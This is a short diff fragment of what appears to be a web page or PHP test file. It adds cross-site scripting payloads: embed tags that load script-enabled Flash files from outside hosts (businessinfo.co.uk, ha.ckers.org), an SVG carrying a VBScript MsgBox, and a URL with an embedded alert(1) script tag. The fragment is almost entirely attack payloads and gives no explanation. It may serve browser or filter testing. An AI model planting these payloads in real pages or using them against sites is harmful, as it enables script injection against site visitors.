@@ -8,6 +8,10 @@ include 'log.php';
        </embed>
 </object>
  
+<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
+<svg contentScriptType=text/vbs><script>MsgBox+1
+       <EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
+
 
 http://www.<script>alert(1)</script .com
  
